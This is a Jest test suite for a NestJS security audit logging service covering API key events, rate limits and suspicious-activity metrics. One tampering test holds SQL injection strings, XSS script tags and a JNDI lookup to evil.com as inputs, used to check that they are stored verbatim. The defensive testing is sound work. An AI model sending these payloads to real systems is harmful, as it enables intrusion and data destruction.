import { Test, TestingModule } from '@nestjs/testing';
import { getRepositoryToken } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { Logger } from '@nestjs/common';
import { SecurityAuditService, AuditEventData } from './security-audit.service';
import {
  SecurityAuditLog,
  SecurityEventType,
} from '../entities/security-audit.entity';
import { MockFactory } from '../../../test/test-utils';
import { randomUUID } from 'crypto';

describe('SecurityAuditService - Security Tests', () => {
  let service: SecurityAuditService;
  let auditRepository: jest.Mocked<Repository<SecurityAuditLog>>;
  let logger: jest.Mocked<Logger>;

  // Test data constants
  const TEST_API_KEY_ID = randomUUID();
  const TEST_HASHED_KEY = 'test-hashed-key-12345';
  const TEST_IP = '192.168.1.100';
  const TEST_USER_AGENT = 'Test-Agent/1.0';
  const TEST_REQUEST_ID = 'req_test_12345';
  const TEST_ENDPOINT = 'POST /api/notifications';
  const TEST_ORG_ID = 'org-test-123';

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        SecurityAuditService,
        {
          provide: getRepositoryToken(SecurityAuditLog),
          useValue: MockFactory.createMockRepository<SecurityAuditLog>(),
        },
        {
          provide: Logger,
          useValue: {
            log: jest.fn(),
            error: jest.fn(),
            warn: jest.fn(),
            debug: jest.fn(),
          },
        },
      ],
    }).compile();

    service = module.get<SecurityAuditService>(SecurityAuditService);
    auditRepository = module.get(getRepositoryToken(SecurityAuditLog));
    logger = module.get(Logger);
  });

  describe('Security Event Logging', () => {
    it('should log security events with all required fields', async () => {
      // Arrange
      const eventData: AuditEventData = {
        eventType: SecurityEventType.API_KEY_USED,
        apiKeyId: TEST_API_KEY_ID,
        ipAddress: TEST_IP,
        userAgent: TEST_USER_AGENT,
        requestId: TEST_REQUEST_ID,
        organizationId: TEST_ORG_ID,
        metadata: { endpoint: TEST_ENDPOINT },
        message: 'Test security event',
      };

      const savedLog = {
        id: randomUUID(),
        ...eventData,
        timestamp: new Date(),
      } as SecurityAuditLog;

      auditRepository.save.mockResolvedValue(savedLog);

      // Act
      await service.logSecurityEvent(eventData);

      // Assert
      expect(auditRepository.save).toHaveBeenCalledTimes(1);
      const savedEntity = auditRepository.save.mock.calls[0][0];

      expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_USED);
      expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
      expect(savedEntity.ipAddress).toBe(TEST_IP);
      expect(savedEntity.userAgent).toBe(TEST_USER_AGENT);
      expect(savedEntity.requestId).toBe(TEST_REQUEST_ID);
      expect(savedEntity.organizationId).toBe(TEST_ORG_ID);
      expect(savedEntity.metadata).toEqual({ endpoint: TEST_ENDPOINT });
      expect(savedEntity.message).toBe('Test security event');
    });

    it('should handle missing optional fields gracefully', async () => {
      // Arrange
      const minimalEventData: AuditEventData = {
        eventType: SecurityEventType.INVALID_API_KEY_ATTEMPT,
      };

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logSecurityEvent(minimalEventData);

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.eventType).toBe(
        SecurityEventType.INVALID_API_KEY_ATTEMPT,
      );
      expect(savedEntity.apiKeyId).toBeNull();
      expect(savedEntity.ipAddress).toBeNull();
      expect(savedEntity.userAgent).toBeNull();
      expect(savedEntity.requestId).toBeNull();
      expect(savedEntity.organizationId).toBeNull();
      expect(savedEntity.metadata).toBeNull();
      expect(savedEntity.message).toBeNull();
    });

    it('should log to application logger for immediate monitoring', async () => {
      // Arrange
      const eventData: AuditEventData = {
        eventType: SecurityEventType.RATE_LIMIT_EXCEEDED,
        apiKeyId: TEST_API_KEY_ID,
        message: 'Rate limit exceeded',
      };

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logSecurityEvent(eventData);

      // Assert
      expect(logger.log).toHaveBeenCalledWith(
        'Security Event: RATE_LIMIT_EXCEEDED - Rate limit exceeded',
        {
          eventType: SecurityEventType.RATE_LIMIT_EXCEEDED,
          apiKeyId: TEST_API_KEY_ID,
          ipAddress: undefined,
          requestId: undefined,
        },
      );
    });

    it('should handle database failures gracefully without throwing', async () => {
      // Arrange
      const eventData: AuditEventData = {
        eventType: SecurityEventType.API_KEY_USED,
        message: 'Test event',
      };

      auditRepository.save.mockRejectedValue(
        new Error('Database connection failed'),
      );

      // Act & Assert - Should not throw
      await expect(service.logSecurityEvent(eventData)).resolves.not.toThrow();

      // Should log the error
      expect(logger.error).toHaveBeenCalledWith(
        'Failed to log security event - this is a critical security issue',
        {
          error: 'Database connection failed',
          eventData,
        },
      );
    });

    it('should prevent security event tampering', async () => {
      // Arrange - Try to inject malicious data
      const maliciousEventData: AuditEventData = {
        eventType: SecurityEventType.API_KEY_USED,
        apiKeyId: "'; DROP TABLE security_audit_log; --",
        ipAddress: "127.0.0.1'; DELETE FROM users; --",
        userAgent: '<script>alert("XSS")</script>',
        message: 'Normal message with ${jndi:ldap://evil.com/a} injection',
        metadata: {
          maliciousScript: '<script>alert(1)</script>',
          sqlInjection: "'; DROP TABLE api_keys; --",
        },
      };

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logSecurityEvent(maliciousEventData);

      // Assert - Data should be stored as-is for forensic analysis
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.apiKeyId).toBe("'; DROP TABLE security_audit_log; --");
      expect(savedEntity.ipAddress).toBe("127.0.0.1'; DELETE FROM users; --");
      expect(savedEntity.userAgent).toBe('<script>alert("XSS")</script>');
      expect(savedEntity.message).toBe(
        'Normal message with ${jndi:ldap://evil.com/a} injection',
      );
      expect(savedEntity.metadata).toEqual({
        maliciousScript: '<script>alert(1)</script>',
        sqlInjection: "'; DROP TABLE api_keys; --",
      });
    });
  });

  describe('API Key Usage Logging', () => {
    it('should log API key usage with proper details', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logApiKeyUsed(
        TEST_API_KEY_ID,
        TEST_IP,
        TEST_USER_AGENT,
        TEST_REQUEST_ID,
        TEST_ENDPOINT,
        TEST_ORG_ID,
      );

      // Assert
      expect(auditRepository.save).toHaveBeenCalledTimes(1);
      const savedEntity = auditRepository.save.mock.calls[0][0];

      expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_USED);
      expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
      expect(savedEntity.ipAddress).toBe(TEST_IP);
      expect(savedEntity.userAgent).toBe(TEST_USER_AGENT);
      expect(savedEntity.requestId).toBe(TEST_REQUEST_ID);
      expect(savedEntity.organizationId).toBe(TEST_ORG_ID);
      expect(savedEntity.metadata).toEqual({ endpoint: TEST_ENDPOINT });
      expect(savedEntity.message).toBe(`API key used for ${TEST_ENDPOINT}`);
    });

    it('should handle missing organization ID', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logApiKeyUsed(
        TEST_API_KEY_ID,
        TEST_IP,
        TEST_USER_AGENT,
        TEST_REQUEST_ID,
        TEST_ENDPOINT,
        // No organization ID
      );

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.organizationId).toBeNull();
    });
  });

  describe('Invalid API Key Attempt Logging', () => {
    it('should log invalid API key attempts', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logInvalidApiKeyAttempt(
        TEST_HASHED_KEY,
        TEST_IP,
        TEST_USER_AGENT,
        TEST_REQUEST_ID,
        TEST_ENDPOINT,
      );

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.eventType).toBe(
        SecurityEventType.INVALID_API_KEY_ATTEMPT,
      );
      expect(savedEntity.hashedKey).toBe(TEST_HASHED_KEY);
      expect(savedEntity.ipAddress).toBe(TEST_IP);
      expect(savedEntity.userAgent).toBe(TEST_USER_AGENT);
      expect(savedEntity.requestId).toBe(TEST_REQUEST_ID);
      expect(savedEntity.metadata).toEqual({ endpoint: TEST_ENDPOINT });
      expect(savedEntity.message).toBe(
        `Invalid API key attempt from ${TEST_IP} for ${TEST_ENDPOINT}`,
      );
    });

    it('should log multiple attempts from same IP for pattern detection', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act - Multiple attempts from same IP
      for (let i = 0; i < 5; i++) {
        await service.logInvalidApiKeyAttempt(
          `${TEST_HASHED_KEY}-${i}`,
          TEST_IP,
          TEST_USER_AGENT,
          `${TEST_REQUEST_ID}-${i}`,
          TEST_ENDPOINT,
        );
      }

      // Assert
      expect(auditRepository.save).toHaveBeenCalledTimes(5);

      // All should be from same IP
      auditRepository.save.mock.calls.forEach((call) => {
        const entity = call[0];
        expect(entity.ipAddress).toBe(TEST_IP);
        expect(entity.eventType).toBe(
          SecurityEventType.INVALID_API_KEY_ATTEMPT,
        );
      });
    });
  });

  describe('Rate Limit Exceeded Logging', () => {
    it('should log rate limit violations with detailed info', async () => {
      // Arrange
      const rateLimitInfo = {
        limit: 1000,
        current: 1001,
        windowMs: 3600000,
      };

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logRateLimitExceeded(
        TEST_API_KEY_ID,
        TEST_IP,
        TEST_USER_AGENT,
        TEST_REQUEST_ID,
        rateLimitInfo,
        TEST_ORG_ID,
      );

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.eventType).toBe(SecurityEventType.RATE_LIMIT_EXCEEDED);
      expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
      expect(savedEntity.metadata).toEqual({ rateLimitInfo });
      expect(savedEntity.message).toBe(
        `Rate limit exceeded: ${rateLimitInfo.current}/${rateLimitInfo.limit} requests in ${rateLimitInfo.windowMs}ms window`,
      );
    });

    it('should track rate limit patterns across different API keys', async () => {
      // Arrange
      const apiKeys = [randomUUID(), randomUUID(), randomUUID()];
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      for (const apiKeyId of apiKeys) {
        await service.logRateLimitExceeded(
          apiKeyId,
          TEST_IP,
          TEST_USER_AGENT,
          TEST_REQUEST_ID,
          { limit: 100, current: 101, windowMs: 3600000 },
        );
      }

      // Assert
      expect(auditRepository.save).toHaveBeenCalledTimes(3);

      // Should log different API keys but same IP (potential abuse)
      const loggedApiKeys = auditRepository.save.mock.calls.map(
        (call) => call[0].apiKeyId,
      );
      expect(new Set(loggedApiKeys).size).toBe(3); // All different

      auditRepository.save.mock.calls.forEach((call) => {
        expect(call[0].ipAddress).toBe(TEST_IP); // Same IP
      });
    });
  });

  describe('API Key Lifecycle Logging', () => {
    it('should log API key creation events', async () => {
      // Arrange
      const keyName = 'Production API Key';
      const scopes = ['notifications:create', 'notifications:read'];
      const createdByUserId = 'user-123';

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logApiKeyCreated(
        TEST_API_KEY_ID,
        keyName,
        scopes,
        createdByUserId,
        TEST_ORG_ID,
      );

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_CREATED);
      expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
      expect(savedEntity.organizationId).toBe(TEST_ORG_ID);
      expect(savedEntity.metadata).toEqual({
        name: keyName,
        scopes,
        createdByUserId,
      });
      expect(savedEntity.message).toBe(
        `API key '${keyName}' created with scopes: ${scopes.join(', ')}`,
      );
    });

    it('should log API key deletion events', async () => {
      // Arrange
      const keyName = 'Old API Key';
      const deletedByUserId = 'admin-456';

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logApiKeyDeleted(
        TEST_API_KEY_ID,
        keyName,
        deletedByUserId,
        TEST_ORG_ID,
      );

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_DELETED);
      expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
      expect(savedEntity.organizationId).toBe(TEST_ORG_ID);
      expect(savedEntity.metadata).toEqual({
        name: keyName,
        deletedByUserId,
      });
      expect(savedEntity.message).toBe(`API key '${keyName}' deleted`);
    });

    it('should log expired key usage attempts', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logExpiredApiKeyAttempt(
        TEST_API_KEY_ID,
        TEST_IP,
        TEST_USER_AGENT,
        TEST_REQUEST_ID,
        TEST_ENDPOINT,
        TEST_ORG_ID,
      );

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_EXPIRED);
      expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
      expect(savedEntity.ipAddress).toBe(TEST_IP);
      expect(savedEntity.metadata).toEqual({ endpoint: TEST_ENDPOINT });
      expect(savedEntity.message).toBe(
        `Expired API key attempt for ${TEST_ENDPOINT}`,
      );
    });
  });

  describe('Security Event Querying and Monitoring', () => {
    it('should retrieve recent events with proper ordering', async () => {
      // Arrange
      const mockEvents = [
        {
          id: '1',
          eventType: SecurityEventType.API_KEY_USED,
          timestamp: new Date(),
        },
        {
          id: '2',
          eventType: SecurityEventType.INVALID_API_KEY_ATTEMPT,
          timestamp: new Date(),
        },
      ] as SecurityAuditLog[];

      const mockQueryBuilder = {
        orderBy: jest.fn().mockReturnThis(),
        limit: jest.fn().mockReturnThis(),
        where: jest.fn().mockReturnThis(),
        getMany: jest.fn().mockResolvedValue(mockEvents),
      };

      auditRepository.createQueryBuilder.mockReturnValue(
        mockQueryBuilder as any,
      );

      // Act
      const result = await service.getRecentEvents(50);

      // Assert
      expect(auditRepository.createQueryBuilder).toHaveBeenCalledWith('audit');
      expect(mockQueryBuilder.orderBy).toHaveBeenCalledWith(
        'audit.timestamp',
        'DESC',
      );
      expect(mockQueryBuilder.limit).toHaveBeenCalledWith(50);
      expect(result).toEqual(mockEvents);
    });

    it('should filter events by type when specified', async () => {
      // Arrange
      const eventTypes = [
        SecurityEventType.INVALID_API_KEY_ATTEMPT,
        SecurityEventType.RATE_LIMIT_EXCEEDED,
      ];
      const mockEvents = [] as SecurityAuditLog[];

      const mockQueryBuilder = {
        orderBy: jest.fn().mockReturnThis(),
        limit: jest.fn().mockReturnThis(),
        where: jest.fn().mockReturnThis(),
        getMany: jest.fn().mockResolvedValue(mockEvents),
      };

      auditRepository.createQueryBuilder.mockReturnValue(
        mockQueryBuilder as any,
      );

      // Act
      await service.getRecentEvents(100, eventTypes);

      // Assert
      expect(mockQueryBuilder.where).toHaveBeenCalledWith(
        'audit.eventType IN (:...eventTypes)',
        { eventTypes },
      );
    });

    it('should retrieve events for specific API key', async () => {
      // Arrange
      const mockEvents = [
        {
          id: '1',
          apiKeyId: TEST_API_KEY_ID,
          eventType: SecurityEventType.API_KEY_USED,
        },
      ] as SecurityAuditLog[];

      auditRepository.find.mockResolvedValue(mockEvents);

      // Act
      const result = await service.getApiKeyEvents(TEST_API_KEY_ID, 25);

      // Assert
      expect(auditRepository.find).toHaveBeenCalledWith({
        where: { apiKeyId: TEST_API_KEY_ID },
        order: { timestamp: 'DESC' },
        take: 25,
      });
      expect(result).toEqual(mockEvents);
    });

    it('should calculate suspicious activity metrics', async () => {
      // Arrange
      auditRepository.count
        .mockResolvedValueOnce(15) // Invalid attempts
        .mockResolvedValueOnce(8) // Rate limit exceeded
        .mockResolvedValueOnce(3); // Expired key attempts

      const mockQueryBuilder = {
        select: jest.fn().mockReturnThis(),
        where: jest.fn().mockReturnThis(),
        andWhere: jest.fn().mockReturnThis(),
        getRawOne: jest.fn().mockResolvedValue({ count: '12' }),
      };

      auditRepository.createQueryBuilder.mockReturnValue(
        mockQueryBuilder as any,
      );

      // Act
      const result = await service.getSuspiciousActivity(24);

      // Assert
      expect(result).toEqual({
        invalidAttempts: 15,
        rateLimitExceeded: 8,
        expiredKeyAttempts: 3,
        uniqueIPs: 12,
      });

      // Verify time window calculation
      expect(auditRepository.count).toHaveBeenCalledWith({
        where: {
          eventType: SecurityEventType.INVALID_API_KEY_ATTEMPT,
          timestamp: { $gte: expect.any(Date) },
        },
      });
    });
  });

  describe('Data Integrity and Security', () => {
    it('should preserve all audit data for forensic analysis', async () => {
      // Arrange - Create event with various data types
      const complexEventData: AuditEventData = {
        eventType: SecurityEventType.SUSPICIOUS_ACTIVITY,
        apiKeyId: TEST_API_KEY_ID,
        ipAddress: TEST_IP,
        userAgent: TEST_USER_AGENT,
        requestId: TEST_REQUEST_ID,
        organizationId: TEST_ORG_ID,
        metadata: {
          endpoint: TEST_ENDPOINT,
          suspiciousHeaders: {
            'x-forwarded-for': '10.0.0.1, 192.168.1.1',
            'user-agent': 'Mozilla/5.0 (suspicious pattern)',
          },
          attemptedScopes: ['admin:delete', 'system:override'],
          rateLimit: { limit: 100, current: 150, windowMs: 3600000 },
          customData: 'Special forensic information',
        },
        message:
          'Suspicious activity detected: multiple privilege escalation attempts',
      };

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logSecurityEvent(complexEventData);

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.metadata).toEqual(complexEventData.metadata);
      expect(savedEntity.message).toBe(complexEventData.message);

      // Verify all security-relevant fields are preserved
      expect(savedEntity.eventType).toBe(complexEventData.eventType);
      expect(savedEntity.apiKeyId).toBe(complexEventData.apiKeyId);
      expect(savedEntity.ipAddress).toBe(complexEventData.ipAddress);
      expect(savedEntity.userAgent).toBe(complexEventData.userAgent);
      expect(savedEntity.requestId).toBe(complexEventData.requestId);
      expect(savedEntity.organizationId).toBe(complexEventData.organizationId);
    });

    it('should handle concurrent logging operations', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      const events = Array.from({ length: 10 }, (_, i) => ({
        eventType: SecurityEventType.API_KEY_USED,
        apiKeyId: `${TEST_API_KEY_ID}-${i}`,
        message: `Concurrent event ${i}`,
      }));

      // Act
      const promises = events.map((event) => service.logSecurityEvent(event));
      await Promise.all(promises);

      // Assert
      expect(auditRepository.save).toHaveBeenCalledTimes(10);

      // Each event should have been saved with correct data
      events.forEach((event, index) => {
        const savedEntity = auditRepository.save.mock.calls[index][0];
        expect(savedEntity.apiKeyId).toBe(event.apiKeyId);
        expect(savedEntity.message).toBe(event.message);
      });
    });

    it('should not lose critical security events on errors', async () => {
      // Arrange
      const criticalEvent: AuditEventData = {
        eventType: SecurityEventType.SUSPICIOUS_ACTIVITY,
        message: 'Critical security breach detected',
      };

      // First attempt fails
      auditRepository.save
        .mockRejectedValueOnce(new Error('Database error'))
        .mockResolvedValueOnce({} as SecurityAuditLog);

      // Act - Try to log critical event
      await service.logSecurityEvent(criticalEvent);

      // Assert - Error should be logged but not thrown
      expect(logger.error).toHaveBeenCalledWith(
        'Failed to log security event - this is a critical security issue',
        {
          error: 'Database error',
          eventData: criticalEvent,
        },
      );

      // Event logging should not have thrown an exception
      expect(auditRepository.save).toHaveBeenCalledTimes(1);
    });

    it('should validate event type integrity', async () => {
      // Arrange
      const validEventTypes = Object.values(SecurityEventType);
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act & Assert
      for (const eventType of validEventTypes) {
        const eventData: AuditEventData = {
          eventType,
          message: `Test event for ${eventType}`,
        };

        await expect(
          service.logSecurityEvent(eventData),
        ).resolves.not.toThrow();

        const savedEntity =
          auditRepository.save.mock.calls[
            auditRepository.save.mock.calls.length - 1
          ][0];
        expect(savedEntity.eventType).toBe(eventType);
      }
    });

    it('should handle large metadata objects safely', async () => {
      // Arrange
      const largeMetadata = {
        largeArray: Array.from({ length: 1000 }, (_, i) => `item-${i}`),
        complexObject: {
          nested: {
            deeply: {
              data: 'test'.repeat(1000),
            },
          },
        },
        headers: Object.fromEntries(
          Array.from({ length: 100 }, (_, i) => [`header-${i}`, `value-${i}`]),
        ),
      };

      const eventData: AuditEventData = {
        eventType: SecurityEventType.API_KEY_USED,
        metadata: largeMetadata,
        message: 'Event with large metadata',
      };

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      await service.logSecurityEvent(eventData);

      // Assert
      const savedEntity = auditRepository.save.mock.calls[0][0];
      expect(savedEntity.metadata).toEqual(largeMetadata);
    });
  });

  describe('Performance and Monitoring', () => {
    it('should handle high-frequency logging efficiently', async () => {
      // Arrange
      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      const events = Array.from({ length: 100 }, (_, i) => ({
        eventType: SecurityEventType.API_KEY_USED,
        apiKeyId: `key-${i}`,
        message: `High frequency event ${i}`,
      }));

      // Act
      const startTime = Date.now();

      for (const event of events) {
        await service.logSecurityEvent(event);
      }

      const endTime = Date.now();
      const duration = endTime - startTime;

      // Assert
      expect(auditRepository.save).toHaveBeenCalledTimes(100);
      expect(duration).toBeLessThan(1000); // Should complete in reasonable time
    });

    it('should provide monitoring hooks through logging', async () => {
      // Arrange
      const highSeverityEvents = [
        SecurityEventType.SUSPICIOUS_ACTIVITY,
        SecurityEventType.RATE_LIMIT_EXCEEDED,
        SecurityEventType.INVALID_API_KEY_ATTEMPT,
      ];

      auditRepository.save.mockResolvedValue({} as SecurityAuditLog);

      // Act
      for (const eventType of highSeverityEvents) {
        await service.logSecurityEvent({
          eventType,
          message: `High severity event: ${eventType}`,
        });
      }

      // Assert - All high severity events should be logged to application logger
      expect(logger.log).toHaveBeenCalledTimes(3);

      highSeverityEvents.forEach((eventType, index) => {
        expect(logger.log).toHaveBeenNthCalledWith(
          index + 1,
          `Security Event: ${eventType} - High severity event: ${eventType}`,
          expect.objectContaining({
            eventType,
          }),
        );
      });
    });
  });
});
